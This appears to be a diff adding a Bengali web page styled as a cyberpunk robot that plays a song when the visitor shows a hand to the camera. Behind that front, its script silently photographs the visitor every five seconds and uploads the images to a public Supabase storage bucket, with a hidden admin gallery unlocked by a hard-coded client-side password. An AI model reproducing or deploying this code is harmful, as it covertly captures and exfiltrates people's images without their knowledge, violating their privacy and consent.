@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cyberpunk EVA AI Center</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #030712;
+            color: #00ffcc;
+        }
+
+        .screen {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .cyber-card {
+            background: rgba(3, 7, 18, 0.92);
+            backdrop-filter: blur(20px);
+            border: 2px solid #00ffcc;
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.25);
+            padding: 25px 20px;
+            border-radius: 16px;
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+
+        .cyber-card h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            margin-bottom: 12px;
+            color: #00ffcc;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.7);
+        }
+
+        .cyber-quotes {
+            background: rgba(0, 255, 204, 0.04);
+            border-left: 4px solid #ff007f;
+            padding: 10px 12px;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #cbd5e1;
+        }
+
+        .cyber-btn {
+            font-family: 'Orbitron', sans-serif;
+            background: #ff007f;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            box-shadow: 0 0 15px rgba(255, 0, 127, 0.4);
+        }
+
+        .cyber-btn:active {
+            transform: scale(0.97);
+        }
+
+        #robot-screen {
+            background: #000;
+        }
+
+        #webcam {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            opacity: 0.25;
+        }
+
+        #hud-top-instruction {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 0, 127, 0.9);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            box-shadow: 0 0 15px #ff007f;
+            z-index: 10;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        #hud-status {
+            position: absolute;
+            top: 60px;
+            left: 15px;
+            background: rgba(3, 7, 18, 0.85);
+            border: 1px solid #00ffcc;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            z-index: 5;
+        }
+
+        /* EVA Robot CSS Styles */
+        .modelViewPort {
+            perspective: 1000px;
+            width: 15rem;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: transparent;
+            overflow: visible;
+        }
+
+        .eva {
+            --EVA-ROTATION-DURATION: 4s;
+            transform-style: preserve-3d;
+            animation: rotateRight var(--EVA-ROTATION-DURATION) linear infinite alternate;
+        }
+
+        .head {
+            position: relative;
+            width: 5.5rem;
+            height: 3.5rem;
+            border-radius: 48% 53% 45% 55% / 79% 79% 20% 22%;
+            background: linear-gradient(to right, white 45%, gray);
+        }
+
+        .eyeChamber {
+            width: 4rem;
+            height: 2.4rem;
+            position: relative;
+            left: 50%;
+            top: 55%;
+            border-radius: 45% 53% 45% 48% / 62% 59% 35% 34%;
+            background-color: #0c203c;
+            box-shadow: 0px 0px 2px 2px white, inset 0px 0px 0px 2px black;
+            transform: translate(-50%, -50%);
+            animation: moveRight var(--EVA-ROTATION-DURATION) linear infinite alternate;
+        }
+
+        .eye {
+            width: 1rem;
+            height: 1.3rem;
+            position: absolute;
+            border-radius: 50%;
+        }
+
+        .eye:first-child {
+            left: 10px;
+            top: 50%;
+            background: repeating-linear-gradient(65deg, #9bdaeb 0px, #9bdaeb 1px, white 2px);
+            box-shadow: inset 0px 0px 5px #04b8d5, 0px 0px 15px 1px #0bdaeb;
+            transform: translate(0, -50%) rotate(-65deg);
+        }
+
+        .eye:nth-child(2) {
+            right: 10px;
+            top: 50%;
+            background: repeating-linear-gradient(-65deg, #9bdaeb 0px, #9bdaeb 1px, white 2px);
+            box-shadow: inset 0px 0px 5px #04b8d5, 0px 0px 15px 1px #0bdaeb;
+            transform: translate(0, -50%) rotate(65deg);
+        }
+
+        .body {
+            width: 5.5rem;
+            height: 7.5rem;
+            position: relative;
+            margin-block-start: 0.25rem;
+            border-radius: 47% 53% 45% 55% / 12% 9% 90% 88%;
+            background: linear-gradient(to right, white 35%, gray);
+        }
+
+        .hand {
+            position: absolute;
+            left: -1.6rem;
+            top: 1.4rem;
+            width: 1.8rem;
+            height: 4.5rem;
+            border-radius: 40%;
+            background: linear-gradient(to left, white 15%, gray);
+            box-shadow: 5px 0px 5px rgba(0, 0, 0, 0.25);
+            transform: rotateY(55deg) rotateZ(25deg);
+        }
+
+        .hand:first-child {
+            animation: compensateRotation var(--EVA-ROTATION-DURATION) linear infinite alternate;
+        }
+
+        .hand:nth-child(2) {
+            left: 88%;
+            top: 1rem;
+            background: linear-gradient(to right, white 15%, gray);
+            transform: rotateY(55deg) rotateZ(-25deg);
+            animation: compensateRotationRight var(--EVA-ROTATION-DURATION) linear infinite alternate;
+        }
+
+        .microphone-prop {
+            position: absolute;
+            left: -1.1rem;
+            top: 3rem;
+            width: 9px;
+            height: 32px;
+            background: #1e293b;
+            border-radius: 4px;
+            transform: rotate(-35deg);
+            box-shadow: 0 0 8px #00ffcc;
+        }
+        .microphone-prop::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -4px;
+            width: 17px;
+            height: 16px;
+            background: radial-gradient(circle, #00ffcc, #030712);
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ffcc;
+        }
+
+        .scannerThing {
+            width: 0;
+            height: 0;
+            position: absolute;
+            left: 60%;
+            top: 10%;
+            border-top: 160px solid #9bdaeb;
+            border-left: 220px solid transparent;
+            border-right: 220px solid transparent;
+            transform-origin: top left;
+            mask: linear-gradient(to right, white, transparent 35%);
+            animation: glow 2s cubic-bezier(0.86, 0, 0.07, 1) infinite;
+        }
+
+        .scannerOrigin {
+            position: absolute;
+            width: 7px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            left: 60%;
+            top: 10%;
+            background: #9bdaeb;
+            box-shadow: inset 0px 0px 5px rgba(0, 0, 0, 0.5);
+            animation: moveRight var(--EVA-ROTATION-DURATION) linear infinite;
+        }
+
+        @keyframes rotateRight {
+            from { transform: rotateY(0deg); }
+            to { transform: rotateY(25deg); }
+        }
+        @keyframes moveRight {
+            from { transform: translate(-50%, -50%); }
+            to { transform: translate(-40%, -50%); }
+        }
+        @keyframes compensateRotation {
+            from { transform: rotateY(55deg) rotateZ(25deg); }
+            to { transform: rotatey(30deg) rotateZ(25deg); }
+        }
+        @keyframes compensateRotationRight {
+            from { transform: rotateY(55deg) rotateZ(-25deg); }
+            to { transform: rotateY(70deg) rotateZ(-25deg); }
+        }
+        @keyframes glow {
+            from { opacity: 0; }
+            20% { opacity: 1; }
+            45% { transform: rotate(-25deg); }
+            75% { transform: rotate(5deg); }
+            100% { opacity: 0; }
+        }
+
+        #robot-container {
+            position: absolute;
+            bottom: -300px;
+            transition: bottom 2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 5;
+        }
+
+        #robot-container.fly-in {
+            bottom: 30px;
+        }
+
+        #admin-toggle-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(3, 7, 18, 0.8);
+            color: #ff007f;
+            border: 1px solid #ff007f;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            z-index: 100;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+        }
+
+        #admin-modal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(3, 7, 18, 0.95);
+            z-index: 200;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .admin-card {
+            background: #0f172a;
+            border: 2px solid #00ffcc;
+            width: 100%;
+            max-width: 650px;
+            max-height: 90vh;
+            border-radius: 14px;
+            padding: 18px;
+            overflow-y: auto;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
+        }
+
+        .folder-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 12px;
+        }
+
+        .folder-box {
+            background: #030712;
+            border: 1px dashed #00ffcc;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .folder-box:hover {
+            background: rgba(0, 255, 204, 0.08);
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+            gap: 10px;
+        }
+
+        .media-box {
+            background: #030712;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            padding: 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .media-box img {
+            width: 100%;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .media-box img:hover {
+            opacity: 0.85;
+        }
+
+        /* ফুলস্ক্রিন ইমেজ ভিউয়ার মোডাল */
+        #fullscreen-modal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 300;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 15px;
+        }
+
+        #fullscreen-img {
+            max-width: 100%;
+            max-height: 80vh;
+            border: 2px solid #00ffcc;
+            border-radius: 8px;
+            box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
+        }
+    </style>
+</head>
+<body>
+
+    <button id="admin-toggle-btn">🔒 ADMIN</button>
+
+    <!-- ১. ওয়েলকাম স্ক্রিন -->
+    <div id="welcome-screen" class="screen">
+        <div class="cyber-card">
+            <h1>SYS_POPUP // প্রোটোকল এন্ট্রি</h1>
+            <div class="cyber-quotes">
+                "শুরু করুন বাটনে ক্লিক করার পর মোবাইল এর সামনে হাত প্রদর্শন করুন। রোবট গান বাজানো শুরু করবে!"
+            </div>
+            <button id="start-btn" class="cyber-btn">[ শুরু করুন ]</button>
+        </div>
+    </div>
+
+    <!-- ২. রোবট ও ক্যামেরা স্ক্রিন -->
+    <div id="robot-screen" class="screen hidden">
+        <video id="webcam" autoplay playsinline muted></video>
+        <div id="hud-top-instruction">STATUS: SCANNING GESTURE... (হাত দেখান)</div>
+        <div id="hud-status">WAITING FOR HAND DETECTION...</div>
+        
+        <div id="robot-container">
+            <div class="modelViewPort">
+                <div class="eva">
+                    <div class="head">
+                        <div class="eyeChamber">
+                            <div class="eye"></div>
+                            <div class="eye"></div>
+                        </div>
+                    </div>
+                    <div class="body">
+                        <div class="hand"></div>
+                        <div class="hand">
+                            <div class="microphone-prop"></div>
+                        </div>
+                        <div class="scannerThing"></div>
+                        <div class="scannerOrigin"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ৩. অ্যাডমিন প্যানেল মডাল -->
+    <div id="admin-modal" class="hidden">
+        <div class="admin-card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #334155; padding-bottom: 8px;">
+                <h3 style="font-family: 'Orbitron'; color: #00ffcc; font-size: 14px;">SECURE ADMIN FOLDERS</h3>
+                <button id="close-admin" style="background:transparent; color:#ff007f; border:1px solid #ff007f; padding:3px 8px; cursor:pointer; font-weight:bold; border-radius:4px;">✕</button>
+            </div>
+            
+            <div id="password-section" style="text-align: center; padding: 20px 10px;">
+                <p style="margin-bottom: 10px; color: #00ffcc; font-size: 13px;">ENTER ADMIN CODE:</p>
+                <input type="password" id="admin-pass" placeholder="••••••" style="padding: 10px; border-radius: 6px; border: 1px solid #00ffcc; background: #030712; color: #00ffcc; width: 70%; text-align: center; font-size: 14px; margin-bottom: 12px;"><br>
+                <button id="submit-pass" class="cyber-btn" style="width: auto; padding: 8px 20px; font-size: 12px;">ACCESS</button>
+            </div>
+
+            <div id="folder-view" class="hidden">
+                <p style="font-size: 12px; color: #94a3b8; margin-bottom: 10px;">ইউজার ফোল্ডারসমূহ:</p>
+                <div id="folderList" class="folder-grid"></div>
+            </div>
+
+            <div id="file-view" class="hidden">
+                <button id="back-to-folders" style="background: #334155; color: #fff; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-bottom: 10px; font-size: 11px;">← ফোল্ডারসমূহে ফিরুন</button>
+                <h4 id="current-folder-title" style="color: #ff007f; margin-bottom: 10px; font-size: 13px;"></h4>
+                <div id="adminGallery" class="gallery-grid"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ৪. ফুলস্ক্রিন ইমেজ প্রিভিউ মডাল -->
+    <div id="fullscreen-modal" class="hidden">
+        <img id="fullscreen-img" src="" alt="Full Screen Preview">
+        <button id="close-fullscreen" class="cyber-btn" style="width: auto; margin-top: 15px; padding: 8px 25px; font-size: 12px;">CLOSE [বন্ধ করুন]</button>
+    </div>
+
+    <audio id="bg-music" src="https://wpquogogtnmryvutgwxn.supabase.co/storage/v1/object/public/selfies/Alan%20Walker%20&%20Ava%20Max%20-%20Alone,%20Pt.%20II%20(Lyrics).mp3" loop></audio>
+
+    <!-- MediaPipe Hands & Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <script>
+        const SUPABASE_URL = 'https://wpquogogtnmryvutgwxn.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_UnFTH8cwZiuAghmjqLgjSQ_Jvr62y4s';
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const welcomeScreen = document.getElementById('welcome-screen');
+        const robotScreen = document.getElementById('robot-screen');
+        const startBtn = document.getElementById('start-btn');
+        const videoElement = document.getElementById('webcam');
+        const hudTopInstruction = document.getElementById('hud-top-instruction');
+        const hudStatus = document.getElementById('hud-status');
+        const robotContainer = document.getElementById('robot-container');
+        const bgMusic = document.getElementById('bg-music');
+
+        const adminToggleBtn = document.getElementById('admin-toggle-btn');
+        const adminModal = document.getElementById('admin-modal');
+        const closeAdmin = document.getElementById('close-admin');
+        const passwordSection = document.getElementById('password-section');
+        const folderView = document.getElementById('folder-view');
+        const fileView = document.getElementById('file-view');
+        const submitPass = document.getElementById('submit-pass');
+        const adminPassInput = document.getElementById('admin-pass');
+        const adminGallery = document.getElementById('adminGallery');
+        const backToFolders = document.getElementById('back-to-folders');
+        const currentFolderTitle = document.getElementById('current-folder-title');
+
+        const fullscreenModal = document.getElementById('fullscreen-modal');
+        const fullscreenImg = document.getElementById('fullscreen-img');
+        const closeFullscreen = document.getElementById('close-fullscreen');
+
+        let mediaStream = null;
+        let selfieInterval = null;
+        let robotTriggered = false;
+        let selfieCount = 0;
+        let cameraInstance = null;
+        let currentUserId = '';
+        let isCapturing = false;
+
+        startBtn.addEventListener('click', async () => {
+            // প্রতিবার নতুন সেশন শুরু করার সময় একটি নতুন ইউনিক ফোল্ডার আইডি তৈরি হবে
+            currentUserId = `User_${Math.floor(1000 + Math.random() * 9000)}_${Date.now().toString().slice(-4)}`;
+            
+            welcomeScreen.classList.add('hidden');
+            robotScreen.classList.remove('hidden');
+            robotTriggered = false;
+            selfieCount = 0;
+            robotContainer.classList.remove('fly-in');
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                videoElement.srcObject = mediaStream;
+
+                startHandTracking();
+            } catch (err) {
+                alert('ক্যামেরা এক্সেস প্রয়োজন!');
+                console.error(err);
+            }
+        });
+
+        function captureAndUploadSelfie() {
+            if (selfieCount >= 100 || !videoElement.videoWidth || isCapturing) return;
+            
+            isCapturing = true;
+            const canvas = document.createElement('canvas');
+            canvas.width = 480;
+            canvas.height = 360;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    selfieCount++;
+                    const fileName = `${currentUserId}/selfie_${Date.now()}.png`;
+                    await supabaseClient.storage.from('selfies').upload(fileName, blob);
+                    
+                    const { data } = supabaseClient.storage.from('selfies').getPublicUrl(fileName);
+                    await supabaseClient.from('admin_selfies').insert([{ 
+                        image_url: data.publicUrl, 
+                        user_folder: currentUserId,
+                        type: 'image' 
+                    }]);
+                }
+                isCapturing = false;
+            }, 'image/png');
+        }
+
+        function startHandTracking() {
+            const hands = new Hands({
+                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+            });
+
+            hands.setOptions({
+                maxNumHands: 1,
+                modelComplexity: 1,
+                minDetectionConfidence: 0.6,
+                minTrackingConfidence: 0.6
+            });
+
+            hands.onResults((results) => {
+                if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+                    const landmarks = results.multiHandLandmarks[0];
+                    const wrist = landmarks[0];
+                    const indexTip = landmarks[8];
+                    
+                    let distance = Math.hypot(indexTip.x - wrist.x, indexTip.y - wrist.y);
+
+                    if (!robotTriggered) {
+                        robotTriggered = true;
+                        robotContainer.classList.add('fly-in');
+                        bgMusic.play().catch(e => {});
+
+                        // প্রথম ছবি সাথে সাথে, এরপর সুনির্দিষ্ট ৫ সেকেন্ড পরপর
+                        captureAndUploadSelfie();
+                        selfieInterval = setInterval(() => {
+                            captureAndUploadSelfie();
+                        }, 5000);
+                    }
+
+                    if (distance < 0.25) {
+                        hudTopInstruction.innerText = "ধন্যবাদ আমার সং শোনার জন্য";
+                        hudStatus.innerText = "STATUS: FIST CLOSED -> EXITING...";
+                        
+                        setTimeout(() => {
+                            resetToHomePage();
+                        }, 1200);
+                    } else {
+                        hudTopInstruction.innerText = "✊ হাত মুষ্টি (Fist) করুন তাহলে সং অফ হবে!";
+                        hudStatus.innerText = "STATUS: SONG PLAYING 🎵";
+                    }
+                } else {
+                    if (!robotTriggered) {
+                        hudTopInstruction.innerText = "STATUS: SCANNING GESTURE... (ক্যামেরার সামনে হাত দেখান)";
+                        hudStatus.innerText = "WAITING FOR HAND DETECTION...";
+                    }
+                }
+            });
+
+            cameraInstance = new Camera(videoElement, {
+                onFrame: async () => {
+                    await hands.send({ image: videoElement });
+                },
+                width: 640,
+                height: 480
+            });
+            cameraInstance.start();
+        }
+
+        function resetToHomePage() {
+            bgMusic.pause();
+            bgMusic.currentTime = 0;
+            clearInterval(selfieInterval);
+
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+
+            robotScreen.classList.add('hidden');
+            welcomeScreen.classList.remove('hidden');
+            robotContainer.classList.remove('fly-in');
+            robotTriggered = false;
+        }
+
+        adminToggleBtn.addEventListener('click', () => adminModal.classList.remove('hidden'));
+        
+        closeAdmin.addEventListener('click', () => {
+            adminModal.classList.add('hidden');
+            passwordSection.classList.remove('hidden');
+            folderView.classList.add('hidden');
+            fileView.classList.add('hidden');
+            adminPassInput.value = '';
+        });
+
+        submitPass.addEventListener('click', () => {
+            if (adminPassInput.value === 'kn375') {
+                passwordSection.classList.add('hidden');
+                folderView.classList.remove('hidden');
+                fetchFolders();
+            } else {
+                alert('ভুল পাসওয়ার্ড!');
+            }
+        });
+
+        async function fetchFolders() {
+            const { data, error } = await supabaseClient
+                .from('admin_selfies')
+                .select('user_folder')
+                .order('created_at', { ascending: false });
+
+            if (error || !data || !data.length) {
+                document.getElementById('folderList').innerHTML = `<p style="color:#94a3b8; font-size:11px;">কোনো ফোল্ডার নেই।</p>`;
+                return;
+            }
+
+            const folders = [...new Set(data.map(item => item.user_folder || 'General'))];
+            const listEl = document.getElementById('folderList');
+            listEl.innerHTML = '';
+
+            folders.forEach(folder => {
+                const box = document.createElement('div');
+                box.className = 'folder-box';
+                box.innerHTML = `
+                    <div style="font-size: 24px; margin-bottom: 4px;">📁</div>
+                    <div style="font-size: 11px; color: #00ffcc; font-weight: bold; margin-bottom: 6px; word-break: break-all;">${folder}</div>
+                    <button onclick="deleteEntireFolder('${folder}', event)" style="background:#ff007f; color:#fff; border:none; padding:3px 6px; border-radius:3px; cursor:pointer; font-size:9px; width:100%;">DELETE 🗑️</button>
+                `;
+                box.onclick = (e) => {
+                    if(e.target.tagName !== 'BUTTON') openFolder(folder);
+                };
+                listEl.appendChild(box);
+            });
+        }
+
+        async function openFolder(folderName) {
+            folderView.classList.add('hidden');
+            fileView.classList.remove('hidden');
+            currentFolderTitle.innerText = `FOLDER: ${folderName}`;
+
+            const { data, error } = await supabaseClient
+                .from('admin_selfies')
+                .select('*')
+                .eq('user_folder', folderName)
+                .order('created_at', { ascending: false });
+
+            if (error || !data.length) {
+                adminGallery.innerHTML = `<p style="color:#94a3b8; font-size:11px;">ফাঁকা ফোল্ডার।</p>`;
+                return;
+            }
+
+            adminGallery.innerHTML = '';
+            data.forEach(item => {
+                const box = document.createElement('div');
+                box.className = 'media-box';
+                box.innerHTML = `
+                    <img src="${item.image_url}" alt="Selfie" onclick="openFullscreen('${item.image_url}')">
+                    <span style="font-size: 8px; color: #00ffcc;">${new Date(item.created_at).toLocaleTimeString()}</span>
+                    <button onclick="deleteRecord('${item.id}', '${item.image_url}')" style="background:#ff007f; color:#fff; border:none; padding:2px; border-radius:3px; cursor:pointer; width:100%; font-size:9px;">DELETE</button>
+                `;
+                adminGallery.appendChild(box);
+            });
+        }
+
+        window.openFullscreen = function(url) {
+            fullscreenImg.src = url;
+            fullscreenModal.classList.remove('hidden');
+        }
+
+        closeFullscreen.addEventListener('click', () => {
+            fullscreenModal.classList.add('hidden');
+            fullscreenImg.src = '';
+        });
+
+        window.deleteEntireFolder = async function(folderName, event) {
+            event.stopPropagation();
+            if (!confirm(`સতর্কতা! "${folderName}" ফোল্ডার এবং এর ভেতরের সব ছবি ডিলিট করতে চান?`)) return;
+
+            const { data } = await supabaseClient
+                .from('admin_selfies')
+                .select('*')
+                .eq('user_folder', folderName);
+
+            if (data && data.length > 0) {
+                for (let item of data) {
+                    const path = item.image_url.split('/selfies/')[1];
+                    if (path) await supabaseClient.storage.from('selfies').remove([path]);
+                }
+                await supabaseClient.from('admin_selfies').delete().eq('user_folder', folderName);
+            }
+            fetchFolders();
+        }
+
+        backToFolders.addEventListener('click', () => {
+            fileView.classList.add('hidden');
+            folderView.classList.remove('hidden');
+            fetchFolders();
+        });
+
+        window.deleteRecord = async function(id, url) {
+            if (!confirm('ফাইলটি ডিলিট করতে চান?')) return;
+            const path = url.split('/selfies/')[1];
+            if (path) await supabaseClient.storage.from('selfies').remove([path]);
+            await supabaseClient.from('admin_selfies').delete().eq('id', id);
+            openFolder(currentFolderTitle.innerText.replace('FOLDER: ', ''));
+        }
+    </script>
+</body>
+</html>
